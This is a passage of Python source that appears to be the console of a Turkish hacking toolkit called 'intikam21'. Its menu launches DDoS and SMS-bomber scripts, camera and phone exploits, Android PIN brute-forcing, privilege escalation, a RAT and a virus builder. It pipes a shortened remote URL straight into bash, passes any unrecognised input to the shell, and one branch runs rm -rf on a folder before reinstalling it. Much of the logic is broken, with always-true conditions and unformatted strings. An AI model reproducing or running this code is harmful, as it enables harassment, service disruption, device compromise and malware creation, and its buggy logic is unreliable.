    	s = os.getcwd()
    	os.system("cd ~ && cd intframework && cd modules")
    	os.system("python3 intmeterpreter.py "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("imei"):
    	if get_input(cdn="osint&int"):
    		hel = help_input[5:]
    		s = os.getcwd()
    		os.system("cd ~ && cd intframework && cd modules")
    		os.system("python3 imei.py "+hel)
    		os.system(f"cd {s}")
    	else:
    		pass	
    if help_input.lower().startswith("mailsearcher"):
    	if get_input(cdn="osint&int"):
    		hel = help_input[help_input.find("mailsearcher"):]
    		s = os.getcwd()
    		os.system("cd ~ && cd intframework && cd modules")
    		os.system("python3 mailsearcher.py"+hel)
    		os.system(f"cd {s}")
    if help_input.startswith("usersearcher"):
    	if get_input(cdn="osint&int"):
    		hel = help_input[help_input.find("usersearcher"):]
    		s = os.getcwd()
    		os.system("cd ~ && cd intframework && cd modules")
    		os.system("python3 usersearcher.py"+hel)
    		os.system(f"cd {s}")
    if help_input.startswith("shotgun"):
    	if get_input(cdn="osint&int"):
    		hel = help_input[help_input.find("shotgun "):]
    		s = os.getcwd()
    		os.system("cd ~ && cd intframework && cd modules")
    		os.system(f"python3 shotgun.py {hel}" if hel else "python3 shotgun.py")
    		os.system(f"cd {s}")
    if help_input.startswith("intcrawler"):
    	if get_input(cdn="osint&int"):
    		hel = help_input[help_input.find("intcrawler "):]
    		s = os.getcwd()
    		os.system("cd ~ && cd intframework && cd modules")
    		os.system("python3 intcrawler.py {hel}" if hel else "python3 intcrawler.py.")
    		os.system(f"cd {s}")
    if help_input.lower().startswith("show"):
    	hr = help_input[help_input.find("show "):]
    	if hr.lower() == "tools" or "tool":
    		print("""
    				140 Tools:
			1-) DDOS
			2-) SMSBOMBER
			3-DİSCORD
			4-)METASPLOİT
			5-)İNTİKAM21
			6-)iptracker
			7-)youtube-hack
			8-)Send email
			9-)OSINT Framework
	SPECİAL:	
			----------------------------------------------
			| [10]android-pin-bruteforce |
			-----------------------------------------------
		[11] bruteforce 
		[12]update
		+90 tools: [13]
		+35 tools: [intshark]
		[14]social hack
		[Oip]using oip -h
		[inTrojan] using introjan -h
    		""")
    	if hr.lower() == "exploits" or "exploit":
    		print("""
    	exploit usage: exp-number
		Exploits:
			[1]-Exploit Database 
			[2]-MSFVENOM
			[3]-MSFCONSOLE
			[4]-NMAP
			[5]-TRAİTOR
			[6]-facebook-id-collector			
			
			SPECİAL:
			---------------------------------------------
		   |. [7]-youtube -------- exploit    |
		   |	[8]-phonesploit	  			|
		   |	[9]-camera exploit			 |
		   |	 [10]-camexp2				   |
			---------------------------------------------	
			
			
			[11] EMAIL FINDER
			[12]-others command: intvenom
			[13]-others command: intvenom
			[14]-others command: intvenom
			[15]-others command: intvenom
    		""")
    if help_input.lower().startswith("run"):
    	get_run = help_input[4:]
    	if use_framework(framework, exploit_name) or get_run == 'exploit':
    		framework = import_framework()
    		run_exploit(framework['current_exploit'])
    	if get_input(cdn="shodan") or get_input(modulename="shodan") or get_run == "shodan":
    		stripting = help_input[help_input.lower().find("bset domain=") + len("bset domain="):].lower().strip() if "Domain" in help_input else ""
    		api = help_input[help_input.lower().find("bset api=") + len("bset api="):].lower().strip() if "bset api=" in help_input else ""
    		try:
    			s = os.getcwd()
    			os.system("cd ~ && cd intframework && cd modules")
    			os.system(f"python3 shodan.py api_key "+api+" --query"+stripting)
    			os.system(f"cd {s}")
    		except:
    			print("Seems like you're hitting a wrong API or not routing your IP properly. Make sure your endpoints are legit and your IP config is on point.")
    	get = help_input[10:]
    	if get_input(cdn="auxiliary" or cdn.startswith("auxiliary/")):
    		get = help_input[10:]
    		if get_input(cdn).startswith("auxiliary/"):
    		    get = help_input[11:]
    	if get.lower() == "dos":
    		stripting = help_input[help_input.find("select") + len("select"):].strip() if "select" in help_input else ""
    		if stripting == "dos.py":
    			os.system("python3 DDOS.py")
    		if stripting.lower() == "doshack":
    			os.system("""
    			cd ~
    			cd intframework
    			cd DoShAcK
    			python Doshack.py
    			""")
    	if get.lower() == "social-enginering":
    		if get_input(cdn="auxiliary/social-enginering"):
    			get1 = get_input[get_input().find("auxoliary/social-enginering"):]
    			get2 = help_input[help_input.find("run "):]
    			if get2 == "--spc-discord":
    				os.system("python3 DISCORD.py")
    	else:
    		t.sleep(0.2)
    elif help_input.lower().startswith("back"):
    	get_input()	
    elif help_input.lower().startswith("info" or "get-help"):
    	global info_get
    	if help_input.lower().startswith("info"):
    		info_get = help_input[5:]
    	if help_input.lower().startswith("get-help"):
    		info_get = help_input[9:]
    	else:
    		print("invalid argument detected")
    	if info_get.lower() == "dns":
    		print("""
    		usage:
    			
    			Commands           Function
    			==========         ========    			
    			DHOST= 			  İP OR HOST
    			-f (Format)   >>    formatting dns example modules: txt, mx, ns, a
    			DPORT
    			
    			example:
    				dns DHOST=127.0.0.1:90 -f txt
    				dns DHOST=127.0.0.1 DPORT=90 -f mx
    			""")
    		if info_get.lower() == "connect":
    			print("""
    			usage: connect CHOST=(HOST) CPORT=(PORT)
    			CHOST:
    				your target host or your want to connect host
    			CPORT:
    				your tadget port or your want to connect port
    			Commands       Function
    		   ==========     =========
    		   CHOST               connecting target host
    		   CPORT               connecting target port
    			""")
    		if info_get.lower() == "vp":
    			print("""
    			Commands      Function
    		   ===========  =========
    		     -a --add           adding and installing vp
    		     -b --build		building vp
    		     
    		     example:
    		     	vp -a or vp --add
    		     	vp -b or vp --build    		     	
    			""")
    		if info_get.lower() == "use":
    			print("""
    			Commands    Function
    		   ==========  =========
    		    modules        using intmodules
    		    exploit            using exploits
    		    exploit/          using exploits but path
    		    payloads       using payloads
    		    auxiliary        using auxiliary modules
    		    shodan          using shodan
    		    osint             using osint
    		    
    		    example:
    		    	use modules /intframework/modules/intcrawler/
    			""")
    elif help_input.startswith("connect"):
    	ip_chef = help_input[help_input.lower().find("CHOSTS=" or "CHOST= "):]
    	port_chef = help_input[help_input.lower().find("CPORT=" or "CPORTS=")]
    	if ip_chef:
    		listen(ip_chef)
    	if ip_chef and port_chef:
    		listen_p(ip_chef, port_chef)
    if help_input.startswith("searchuser"):
    	if get_input(cdn="osint&int"):
    		hel = help_input[help_input.find("searchuser "):]
    		s = os.getcwd()
    		os.system("cd ~ && cd intframework && cd modules")
    		os.system("python3 searchuser.py"+hel if hel else "python3 searchuser.py")
    		os.system(f"cd {s}")
    	else:
    		os.system(help_input)
    if help_input == "t-1":
    	if get_input(cdn="osint&int"):
    		os.system("python3 DDOS.py")
    elif help_input == "t-3":
    	if get_input(cdn="osint&int"):
    		os.system("python3 DİSCORD.py")
    elif help_input == "t-2":
    	if get_input(cdn="osint&int"):
    		os.system("python3 SMSBOMBER.py")
    elif help_input == "t-4":
    	time.sleep(1)
    	print("termux [y] kali [n]")
    	k = input("Do you using [termux/kali] ?")
    	if k == "y" or "Y" or "termux" or "Termux" or "TERMUX":
    		os.system("pkg update -y && pkg upgrade -y && apt update -y && apt upgrade -y")
    		os.system("pkg install wget -y")
    		os.system("wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh")
    		os.system("chmod +x metasploit.sh")
    		os.system("./metasploit.sh")
    	elif k == "n" or "N" or "kali" or "Kali" or "KALİ":
    		os.system("sudo apt-get install metasploit-framework")
    		os.system("msfconsole")
    elif help_input == "t-5":
    	if get_input(cdn="osint&int"):
    		os.system("""apt update & apt upgrade
sudo apt install git
sudo apt install python3-pyfiglet
sudo apt install python3 
sudo apt install python3-base64
sudo apt install python3-colorama
sudo apt install python3-requests

git clone https://github.com/Intikam21kurucu/Intikam21

cd Intikam21

python3 Intıkam21.py""")
    elif help_input == "exp-1":
    	if get_input(cdn="osint&int"):
    		print("the exploit is not working ")
    elif help_input == "exp-2":
    	try:
    		os.system("msfconsole")
    	except:
    		os.system("sudo apt-get install meta sploit-framework")
    elif help_input == "exp-3":
    	try:
    		os.system("msfvenom")
    	except:
    		os.system("sudo apt-get install metasploit-framework")
    elif help_input == "exp-4":
    	try:
    		os.system("pip install nmap")
    		os.system("nmap")
    	except:
    		os.system("sudo apt-get install nmap")
    elif help_input == "exit":
    	print("Bye bye / yine bekleriz ")
    	os.system("exit")
    	break
    elif help_input == "t-6":
    	if get_input(cdn="osint&int"):
    		os.system("python3 iptracker.py")
    elif help_input == "exp-5":
    	if get_input(cdn="osint&int"):
    		os.system("""git clone https://github.com/liamg/traitor
		cd traitor
		traitor -p -e docker:writable-socket			
		""")
    elif help_input == "exit":
    	print("exiting console...")
    	time.sleep(2)
    	os.system("exit")
    elif help_input == "exp-6":
    	if get_input(cdn="osint&int"):
    		os.system("python2 id-collector.py")
    elif help_input == "exp-7":
    	if get_input(cdn="osint&int"):
    		os.system("python3 specialintikam21youtube.py")
    elif help_input == "exp-8":
    	if get_input(cdn="osint&int"):
    		os.system("""
    	git clone https://github.com/AzeemIdrisi/PhoneSploit-Pro.git
    	cd PhoneSploit-Pro/
    	pip install -r requirements.txt
    	python3 phonesploitpro.py
    	""")
    elif help_input == "exp-9":
    	if get_input(cdn="osint&int"):
    		os.system("python expcamera.py")
    elif help_input == "exp-10":
    	s = input ("Do yo want to continue [y/n]")
    	if s == "y":
    		if get_input(cdn="osint&int"):
    			os.system("python3 camexp2.py")
    		else:
    			pass
    	elif s == "n":
    		print("restarting...")
    		time.sleep(3)
    		os.system("python3 intconsoleV4.py")
    elif help_input == "t-7": 
    	os.system("""
		git clone https://github.com/in4osecurity/Youtube-Hack
		cd Youtube-Hack
		bash kurulum.sh		
		""")
    elif help_input == "t-8":
    	if get_input(cdn="osint&int"):
    		s = os.getcwd()
    		os.system("cd ~ && cd intframework && cd modules")
    		os.system("python3 sendemail.py")
    		os.system(f"cd {s}")
    elif help_input == "t-9":
    	s = os.getcwd()
    	os.system("cd ~ && cd intframework && cd modules")
    	os.system("python3 osint.py")
    	os.system(f"cd {s}")
    elif help_input == "exp-11":
    	os.system("python3 emailfinder.py")
    elif help_input == "t-10":
    	s = input("do you want to continue? [y/n]")
    	if s == "y":
    		os.system("""			
			git clone https://github.com/urbanadventurer/Android-PIN-Bruteforce
			cd Android-PIN-Bruteforce
			./android-pin-bruteforce crack --length 6				
			""")
    	elif s == "n":
    		print("restarting...")
    		time.sleep(3)
    		os.system("python3 intconsoleV4.py")
    elif help_input == "banner":
    	banner()
    	menu_banner()
    elif help_input.startswith("vp"):
    	if '-' not in help_input:
    		print("please arguments")
    	if '-a' or '--add' in help_input:
    		global add_add
    		add_add = "ADDED"
    	if '-a' or '--add' not in help_input:
    		add_add = None
    	if '-b' or '--build' in help_input:
    		if add_add == None:
    			print("please use vp add command first")
    			global add_slan
    			add_slan = None
    		if add_add == "ADDED":
    			import pyfiglet
    			a = pyfiglet.figlet_format("INTIKAM21 OFFİCİAL") 
    			print(a)
    			print("starting")
    			t.sleep(3)
    			os.system("sh intvirtualstarter.sh")
    			add_job("intikam21 virtual pc")
    			add_slan = "YES"
    		elif add_slan == "YES" and add_add == "ADDED":
    			print("builded you are must use -all")
    	if '-all' in help_input:
    		os.system("""
			python3 intofficial.py
			""")
    elif help_input == "anim-exit":
    	s = os.getcwd()
    	os.system("cd ~ && cd intframework && cd modules")
    	os.system("python3 intly.py")
    	os.system(f"cd {s}")
    	exit() 
    else:
    	exit()	   
    if help_input == "mode-admin":
    	print("you are admin mode :)")
    	os.system("clear")
    	banner()
    	menu_banner()
    	admin_input = input("""
		┌──(intikam21-cyber@root[admin]
		└─$""")
    	add_job("admin_mode")
    	if admin_input == "set -a admin$Off":
    		print("adding set")
    		t.sleep(2)
    		print("offed a set$ADMİN")
    		break
    		exit()
    		os.system("intconsole")
    	if admin_input == "set -a admin$Name '{user_name}'":
    		global user_name
    		print("Now you are name is: "+user_name)
    	if admin_input == "set -a admin$WHOAMİ":
    		global whoami
    		whoami = user_name
    		user_name = getpass.getuser()
    		print(user_name)
    	if admin_input == "set -a admin$RAUNT {name} {command}":
    		global command
    		global namesr
    		os.system("touch "+namesr)
    		os.system("nano "+namesr)
    		os.system(command)
    		os.system("source "+namesr)
    		global list
    		list = [f"""
			140 Tools:
			1-) DDOS
			2-) SMSBOMBER
			3-DİSCORD
			4-)METASPLOİT
			5-)İNTİKAM21
			6-)iptracker
			7-)youtube-hack
			8-)Send email
			9-)OSINT Framework
	SPECİAL:	
			----------------------------------------------
			| [10]android-pin-bruteforce |
			-----------------------------------------------
		[11] bruteforce 
		[12]update
		+90 tools: [13]
		+35 tools: [intshark]
		[14]social hack
		[Oip]using oip -h
		[inTrojan] using introjan -h
		[{name}] using {name} -h
		"""]
    	if admin_input == "set -a admin$HELP":
    		print(list)
    	if admin_input == "set -a admin$RASSN":
    		print("RAT SET SELECT NOTEPAD")
    		os.system("introjan -h")
    	if admin_input == "use {u_name}":
    		global u_name
    		u_name = ["intikam21-framework", "metasploit-framework", "Hunner-Framework", "Katana-Framework", "Osint-Framework", "RecoTak-Framework", "Zkit-FRAMEWORK", "On-The-Go-FRAMEWORK", "Cage-FRAMEWORK"]
    		if u_name == "Cage-FRAMEWORK":
    			os.system("bash <(wget -qO- https://bit.ly/3ilzOl9)")
    			os.system("git clone https://github.com/xzendercage/cageframework")
    			os.system("cd cageframework")
    			os.system("python cageframework.py")
    		if u_name == "On-The-Go-FRAMEWORK":
    			os.system("git clone https://github.com/Aoshee/onTHEgo")
    			os.system("cd onTHEgo")
    			os.system("pip install -r REQUIREMENTS")
    			os.system("python onTHEgo.py")
    		if u_name == "Zkit-FRAMEWORK":
    			os.system("git clone git clone https://github.com/000Zer000/ZKit-Framework")
    			os.system("cd Zkit-Framework")
    			os.system("pip install -r requirements.txt")
    		if u_name == "RecoTak-FRAMEWORK":
    			os.system("git clone https://github.com/recotak/recotak-framework.git && cd recotak && sh install.sh")
    		if u_name == "Osint-FRAMEWORK":
    			os.system("""
				git clone https://github.com/TermuxHackz/X-osint
				cd X-osint
				#3) Grant permissions and run install file
				chmod +x *
				bash setup.sh
				""")
    		if u_name == "Katana-Framework" or "Katana-FRAMEWORK":
    			os.system("""
				git clone https://github.com/PowerScript/KatanaFramework.git
				cd KatanaFramework
				sh dependencies
				python install
				""")
    		if u_name == "Hunner-Framework" or "Hunner-FRAMEWORK":
    			os.system("git clone https://github.com/b3-v3r/Hunner")
    			os.system("cd Hunner")
    			os.system("python3 hunner.py")
    		if u_name == "metasploit-framework" or "Metasploit-Framework" or "Metasploit-FRAMEWORK":
    			os.system("msfconsole")
    		else:
    			os.system("pkg update -y && pkg upgrade -y && apt update -y && apt upgrade -y")
    			os.system("pkg install wget -y")
    			os.system("wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh")
    			os.system("chmod +x metasploit.sh")
    			os.system("./metasploit.sh")
    		if u_name == "intikam21-framework" or "İntikam21-Framework" or "intikam21-FRAMEWORK" or "İNTİKAM21-FRAMEWORK":
    			exit()
    			os.system("intconsole")
    		else:
    			os.system("""
				cd ~
				rm -rf intframework
				git clone https://github.com/Intikam21kurucu/intframework
				cd intframework
				chmod +x terbuild.sh
				./terbuild.sh
    			""")
    if help_input.startswith("build"):
        print("please to use parses ")
        if help_input in "-v":
        	print("do you continue?")
        	print("we have no responsibility")
        	s = input("Do you want to continue?")
        	if s.lower() == "n":
        		exit()
        	if s.lower() == "Y":
        		pass
        		os.system("""			
			git clone https://github.com/Cyber-Dioxide/Virus-Builder/
			cd Virus-Builder
			ls
			pip install -r requirements.txt
			python3 Builder.py
			""")
        else:
        	print("please create virus")
        if help_input in "-b" or "--build":
        	os.system("sh build.sh")
        if help_input in "-apk" or "--apk":
        	os.system("sh apkbuild.sh")
        	add_job("virus apk building") and add_jb("virus")
        else:
        	print("please to use argparse or chat with intai!")
		
    if help_input == f"item {moduleastr}":
    	global using_module
    	global s_name
    	global p_name
    	global pyc_name
    	global r_name
    	global h_name
    	global php_name
    	using_module = [f"{s_name}.sh", f"{p_name}.py", f"{pyc_name}.pyc", f"{r_name}.ruby", f"{h_name}.html", f"{php_name}.php"]
    	if module not in using_module:
    		print("<> module not finded <>")
    	if module == "{s_name}.sh":    			
    		os.system("sh {s_name}.sh")
    	if module == "{p_name}.py":
    		os.system("python {p_name}.py")
    	if module == "{pyc_name}.pyc":
    		os.system("pyc {pyc_name}.pyc")
    	if module == "{r_name}.ruby":
    		os.system("ruby {r_name}.ruby")
    	if module == "{h_name}.html":
    		os.system("html {h_name}.html")
    	if module == "{php_name}.php":
    		os.system("php {php_name}.php")
    if help_input == "t-11":
    	os.system("python3 BRUTEFORCE.py")
    	add_job("python3 BRUTEFORCE.py")
    if help_input == "t-13":
    	os.system("python3 +90wifitools.py")
    if help_input == "t-14":
    	os.system("python3 socialhack.py")
    if help_input == "star":
        os.system("""
    			chmod +x intframework
				cd intframework
				chmod +x +90wifitools.py
				chmod +x DDOS.py
				chmod +x DISCORD.py
				chmod +x DİSCORD.py
				chmod +x OSINT.py
				chmod +x SMSBOMBER.py
				chmod +x base.py
				chmod +x build.sh
				chmod +x camexp2.py
				chmod +x data.json
				chmod +x emailfinder.py
				chmod +x expcamera.py
				chmod +x id-collector.py
				chmo:d +x installintconsole.py
				chmod +x int.desktop
				chmod +x intSHARK.py
				chmod +x intai.py
				chmod +x intautoupdate.py
				chmod +x intconsoleV4.py
				chmod +x intikam21.py
				chmod +x introjan
				chmod +x oip
				chmod +x intweb
				chmod +x intcam.py
				chmod +x sendemail.py
				chmod +x startoolkit.py
				chmod +x terbuild.sh				
    		""")
        print("chmoded all tools")
    if help_input == "neofetch":
    	os.system("python3 neofetch.py")
    	add_job("neofetch")
    if help_input == "osint":
    	print("https://osintframework.com/")
    elif help_input == "whoami":
    	username = getpass.getuser()
    	# Sistemin platform bilgisini alma
    	platform_info = platform.system()
    	print("ami:: " + Fore.GREEN + username)
    help = {"com-help" or "Com-help" or "Com-Help" or "com-HELP" or "COM-help" or "COM-HELP"}
    if help_input in help:
    	os.system("help")
    valid_commands = {
    "t-14", "t-13", "12", "t-11", "t-10", "t-9", "t-8", "t-7", "t-6", "t-5", "t-4", "t-3", "t-2", "t-1",
    "exp-11", "exp-10", "exp-9", "exp-8", "exp-7", "exp-6", "exp-5", "exp-4",
    "exp-3", "exp-2", "exp-1", "neofetch", "com-help", "intshark", "oip", "introjan", "intai", "track", "build", "mode-admin", "use", "set", "show", "build", "mode-", "back", "item", "search", "show commands", "int install", "connect", "int", "install", "mode-ninja", "int install mode-ninja", "int install git", "int install aichat", "use", "exploit", "bset", "banner", "py-search", "payload-search", "exp-search", "exploit-search", "jobs", "jobs -k", "dns", "help", "use ", "intcrawler", "searchuser", "mailsearch", "phonesearch", "connectbot", "meterpreter", "shotgun", "imei", "exp-search", "py-search"
    }
    
    if help_input.lower() not in valid_commands:
    	self_dir = os.getcwd()
    	os.system("cd ~")
    	os.system(help_input)
    	add_job(help_input)
    	os.system(f"cd {self_dir}")
    if help_input == "intai" or help_input == "İntai" or  help_input == "İNTAİ" or help_input == "İNTai" or help_input == "intAİ":
    	os.system("python3 intai.py")
    	add_job("intai")
    if help_input == "intaiv2" or help_input == "İntaiv2" or help_input == "İntaiV2"or help_input == "İNTAİV2" or help_input == "İNTaiv2" or help_input == "intAİ" or help_input == "İNTaiV2" or help_input == "intAİV2":
    	s = os.getcwd()
    	os.system(f"""
    	cd ~
    	cd intframework
    	cd modules
    	""")
    	os.system("python3 intaiV2.py")
    	os.system(f"cd {s}")
    	add_job("intaiv2")
    	